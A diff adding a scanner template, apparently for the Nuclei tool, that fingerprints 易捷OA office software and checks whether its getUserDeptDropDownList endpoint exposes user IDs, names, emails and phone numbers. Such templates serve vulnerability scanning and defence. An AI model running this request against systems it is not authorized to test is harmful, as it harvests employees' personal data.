@@ -1,0 +1,43 @@
+id: yijie-oa-getuserdeptdropdownlist-info-leak
+info:
+  name: 易捷OA协同办公软件 getUserDeptDropDownList 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+  description: |
+    易捷OA协同办公软件存在一个信息泄露漏洞，通过访问特定的API端点，可以获取用户的部门下拉列表信息，包括用户ID、用户名、邮箱和手机号。
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "协同办公系统"
+        part: body
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /autohint.t?op=getUserDeptDropDownList HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{userid:"
+          - "username:"
+          - "email:"
+          - "mobile:"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+      - type: status
+        status:
+          - 200
